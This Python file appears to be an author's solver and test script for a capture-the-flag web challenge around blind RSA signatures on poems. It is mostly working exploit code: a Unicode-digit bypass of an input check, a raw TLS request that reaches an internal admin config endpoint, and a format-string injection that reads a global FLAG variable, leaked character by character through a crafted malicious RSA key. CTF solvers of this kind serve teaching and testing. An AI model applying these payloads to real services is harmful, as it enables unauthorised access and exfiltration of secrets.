#!/usr/bin/env python
# -*- coding: utf-8 -*-


import sys
import string
import hashlib
import random
import socket, ssl
import json
from urllib import parse
from base64 import b64encode, b64decode

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.backends import default_backend

import requests
from sympy import randprime, isprime, nthroot_mod, ntheory, invert
from pkcs1 import emsa_pss

# local file import
from cli import *

# from app.py
famous_writers = [
    "Lord Byron",
    "Percy Bysshe Shelley",
    "John Keats",
    "Victor Hugo",
    "Walter Scott",
    "Samuel Taylor Coleridge",
    "Adam Mickiewicz",
    "Juliusz Słowacki",
    "Aubrey Beardsley",
    "Oscar Wilde",
    "Alphonse Mucha",
    "Gustav Klimt",
    "Émile Gallé",
    "Stanisław Przybyszewski",
    "Wacław Berent",
    "Gabriela Zapolska",
    "Stanisław Wyspiański",
    "Kazimierz Przerwa-Tetmajer",
    "Władysław Reymont"
]


# pre-generated keys, to speed up solver; use genkey and prep_key for new keys
normal_sk_pem = '''
-----BEGIN PRIVATE KEY-----

-----END PRIVATE KEY-----
'''

malicious_sk_pem = '''
-----BEGIN PRIVATE KEY-----

-----END PRIVATE KEY-----
'''


def prep_key():
    print("Generating malicious RSA key")
    e = 521
    p = 4
    while not isprime(p):
        # e | phi(n)
        pp = randprime(1<<(1024-e.bit_length()-2), 1<<(1024-e.bit_length()-1))
        p = (2 * e * pp) + 1
    q = randprime(1<<(2048-p.bit_length()-2), 1<<(2048-p.bit_length()-1))
    n = p * q

    d = rsa.rsa_recover_private_exponent(p, q, e)
    dmp1 = rsa.rsa_crt_dmp1(d, p)
    dmq1 = rsa.rsa_crt_dmq1(d, q)
    iqmp = rsa.rsa_crt_iqmp(p, q)
    
    rsa_key = rsa.RSAPrivateNumbers(p, q, d, dmp1, dmq1, iqmp, rsa.RSAPublicNumbers(e, n))
    private_key = rsa_key.private_key(default_backend(), unsafe_skip_rsa_key_validation=True)

    private_key_str = private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    )

    public_key_str = private_key.public_key().public_bytes(
        serialization.Encoding.OpenSSH,
        serialization.PublicFormat.OpenSSH
    )

    print(f"Private Key:\n{private_key_str.decode('utf-8')}")
    print(f"Public Key:\n{public_key_str.decode('utf-8')}")
    return private_key, public_key_str


def e_equivalent(a, b, sk):
    e = sk.public_key().public_numbers().e
    n = sk.public_key().public_numbers().n
    p = sk.private_numbers().p
    q = sk.private_numbers().q

    x = ((p-1)*(q-1)) // e
    return pow(a, x, n) == pow(b, x, n)


def find_valid_char(sk, original_poem, blinded_msg):
    blinded_msg = int.from_bytes(b64decode(blinded_msg), "big")
    writer = famous_writers[(len(original_poem)) % len(famous_writers)]

    for key_size in [sk.key_size-1, sk.key_size, sk.key_size+1]:  # because PSS encoding is problematic
        for possible_char in string.printable:
            msg = f"{possible_char}\n~{writer}"
            msg = emsa_pss.encode(msg.encode(), key_size, hash_class=hashlib.sha384, salt=b"")
            msg = int.from_bytes(msg, "big")

            if e_equivalent(msg, blinded_msg, sk):
                return possible_char
    return None


def randstr(N):
    return ''.join(random.SystemRandom().choice(string.ascii_letters) for _ in range(N))


def solve(cli, gh_user, gh_key):
    print("Solver started")

    # sk, pk = prep_key()
    # input("Now upload pubkey to GH and save privkey in malicious_sk_pem variable (this file)")
    sk, pk = impkey(malicious_sk_pem)

    username = f"gros{randstr(10)}@example.com" 
    password = f"lalaland{randstr(10)}"

    try:
        cli.register(username, password)
        cli.login(username, password)
        cli.verify()

        resp = cli.config_oidc(gh_user, gh_key)
        data = resp.json()
        assert 'message' in data, data
        assert data['message'] == "Updated", data

        # ----------- bug 1
        print("  Testing bug 1")
        poem = "whatever"
        cli.make_poem(poem)

        resp = cli.blind_init("5")  # check no easy solve
        assert "FORBIDDEN" in resp.text or "Invalid type" in resp.text
        # resp = cli.blind_init(u"٥") # python's json encoding would convert our unicode to "\u0665" literal
        resp = requests.post(cli.url + '/api/blind/init',
            headers={"x-access-token": cli.jwt, "Content-Type": "application/json"},
            data='{"type": "٥"}'.encode('utf-8'),  # 5 as interpreted by python
            verify=cli.tls
        )
        data = resp.json()
        assert 'blindedMsg' in data, data

        # ----------- bug 2
        print("  Testing bug 2")
        resp = cli.config_blind(3)  # check no easy solve
        assert "FORBIDDEN" in resp.text or "No rsaVariant" in resp.text

        # easiest would be to do this from Burp
        addr = parse.urlparse(cli.url)
        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s_sock = context.wrap_socket(sock, server_hostname=addr.hostname)
        s_sock.connect((addr.hostname, addr.port))

        # if getting DECRYPTION_FAILED_OR_BAD_RECORD_MAC (or proxy timeouts), then adjust content-length
        raw_request = f"""
POST http:http://localhost:9000/admin/config HTTP/1.1
Host: {addr.hostname}:{addr.port}
Content-Length: 19
x-access-token: {cli.jwt}
Content-Type: application/json

{{"rsaVariant":"3"}}
"""
        s_sock.send(raw_request[1:].encode())
        data = b""
        while True:
            resp = s_sock.recv(2048)
            if len(resp) <= 0:
                break
            data += resp
        s_sock.close()
        data = data.decode().split('\n')[-1]
        data = json.loads(data)
        assert 'message' in data, data
        assert data['message'] == "Updated", data

        # ----------- bug 3
        print("  Testing bug 3 and 4")
        resp = cli.get_user()
        if resp.json()['rsaVariant'] not in ["3", 3]:
            print("Setting rsaVariant failed, contact task author")
            return

        resp = cli.make_poem("{global_signature_maker}")  # check no easy solve
        assert "FORBIDDEN" in resp.text

        # solving one-char-at-time
        flag = ""
        while len(flag) == 0 or flag[-1] != "}":
            # poem like: {global_signature_maker.__init__.__globals__[FLAG][17]}
            poem = "{{global_signature_maker.__init__.__globals__[FLAG][{}]}}".format(len(flag))

            # bug 3 here
            resp = requests.post(cli.url + '/api/poem', headers={"x-access-token": cli.jwt}, json={
                "poem": poem,
                "POEM": "A nice poem"
            }, verify=cli.tls)
            assert "FORBIDDEN" not in resp.text

            resp = requests.post(cli.url + '/api/blind/init',
                headers={"x-access-token": cli.jwt, "Content-Type": "application/json"},
                data='{"type": "٥"}'.encode('utf-8'),  # 5 as interpreted by python
                verify=cli.tls
            )
            assert "blindedMsg" in resp.json(), resp.text
            blinded_msg = resp.json()["blindedMsg"]

            # finally crypto stuff
            flag += find_valid_char(sk, poem, blinded_msg)
            if not flag:
                print("Cannot find next flag character, contact task author")
                return flag
            print(flag)

        print(flag)
        return flag
    finally:
        print('Removing tmp user')
        cli.destroy()

    return None


def blind_init_fail(jwt):
    resp = requests.post(URL + '/api/blind/init', verify=False)
    assert "No token" in resp.json()["message"], resp.text

    resp = requests.post(URL + '/api/blind/init', headers={"x-access-token": "lol"}, verify=False)
    assert "Unauthorized" in resp.json()["message"], resp.text

    resp = requests.post(URL + '/api/blind/init', headers={"x-access-token": jwt}, verify=False)
    assert "OIDC not configured" in resp.json()["message"], resp.text


def test_basic(cli, gh_user, gh_key):
    print("Start basic functionality tests")
    username = f"gros{randstr(10)}@example.com" 
    password = f"lalaland-{randstr(10)}"

    # sk, _ = genkey()
    # input("Now upload pubkey to GH and save privkey in normal_sk_pem variable (this file)")

    sk, _ = impkey(normal_sk_pem)
    example_msg = b"lol test mamam papapa asd"
    example_sign = rfc_blind_sign(sk, b64encode(example_msg))
    assert example_sign is not None

    resp = cli.public_access()
    assert resp.status_code == 200, resp.text

    resp = cli.register(username, password)
    assert "User registered successfully" in resp.json()["message"], resp.text

    resp = cli.login(username, password)
    assert 'accessToken' in resp.json(), resp.text
    jwt = resp.json()['accessToken']

    resp = cli.make_poem("anything")
    assert "Not verified" in resp.json()["message"], resp.text

    resp = cli.verify()
    assert 'message' in resp.json(), resp.text
    assert resp.json()["message"] == "Verified", resp.text

    blind_init_fail(jwt)

    try:
        resp = cli.config_oidc(gh_user, gh_key)
        assert "Updated" in resp.json()["message"], resp.text

        poem = "somepoem"
        resp = cli.make_poem(poem)
        assert "Poem saved" in resp.json()["message"], resp.text

        resp = cli.blind_init()
        assert "blindedMsg" in resp.json(), resp.text
        blinded_msg = resp.json()["blindedMsg"]
        print("blinded msg", blinded_msg)

        blinded_sign = rfc_blind_sign(sk, blinded_msg)
        if not blinded_sign:
            print("ERROR when signing locally, fix immediately")
            return
        print("blinded signature", b64encode(blinded_sign).decode())

        resp = cli.blind_finalize(blinded_sign)
        assert "signature" in resp.json(), resp.text
        signature = resp.json()["signature"]
        print("signature", signature)
    finally:
        resp = cli.destroy()
        assert "destroyed" in resp.json().get("message", ""), resp.text
        print('-'*20)


URL = None
if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python ./solve.py <addr>")
        sys.exit(1)

    # CONFIG
    gh_user = "grossquildu"  # set manually to some GH user
    gh_key = "norkey"  # set manually to name of the key imported to GH
    
    # CONFIG solver
    s_gh_user = "grossquildu"  # set manually to some GH user
    s_gh_key = "malkey"  # set manually to name of the key imported to GH
    # --- CONFIG end

    URL = sys.argv[1]

    # test basic functionality
    cli = Cli(URL, tls=False)
    test_basic(cli, gh_user, gh_key)

    # run solver
    cli = Cli(URL, tls=False)
    solve(cli, s_gh_user, s_gh_key)
